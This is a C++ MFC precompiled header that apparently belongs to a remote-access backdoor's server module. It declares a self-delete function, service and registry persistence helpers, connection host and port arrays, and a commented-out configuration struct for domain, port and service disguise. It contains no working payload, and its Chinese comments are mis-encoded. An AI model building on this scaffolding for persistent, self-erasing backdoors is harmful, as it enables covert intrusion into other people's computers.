// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__1DD676CB_55D6_4485_812A_D85014872E24__INCLUDED_)
#define AFX_STDAFX_H__1DD676CB_55D6_4485_812A_D85014872E24__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// #define _WIN32_WINNT 0x0500

#include <afxwin.h>
#include "afxinet.h"
// Insert your headers here
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers

#include <stdio.h>
//#include <windows.h>
//#include "MyFunc.h"

#include "ClientSocket.h"
#include <shlwapi.h>

#pragma comment(lib,"shlwapi.lib")
BOOL DeleteMe();  // ��ɾ��

void SetGroup(LPCTSTR lpServiceName, LPCTSTR lpGroupName);  //�޸ķ���
void WriteRegExg(LPCTSTR lpServiceName ,LPTSTR lpSame ,LPCTSTR lpHostID);

#pragma comment(lib,"./uuid.lib")

// struct DLLSERVER_INFO
// {
// 	char Domain[100];       //���ߵ�ַ
// 	char Port[32];              //���߶˿�
// 	char Version[100];      //���߰汾
// 	char Group[100];        //���߷���
// 	char SocketHead[100];   //��������
// 	char SerName[100];		//��������
// 	char Serdisplay[128];	//��ʾ����
// 	char Serdesc[256];		//��������
// 	TCHAR szGetGroup[256];	//����Ψһ��ʶ
// 	BOOL  bServer;			//�Ƿ�������
// 	BOOL  bRuns;			//��д������
// 	BOOL  bRunOnce;			//�Ƿ�Ϊ��ɫ��װ
// 	TCHAR URL[256];         //�ؼ���ַ
// };



extern UINT	   nConnect;  //��������
extern LPCTSTR lpConnects[2];  //��������
extern DWORD   szdwPort[2];     //���߶˿�
// TODO: reference additional headers your program requires here

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__1DD676CB_55D6_4485_812A_D85014872E24__INCLUDED_)
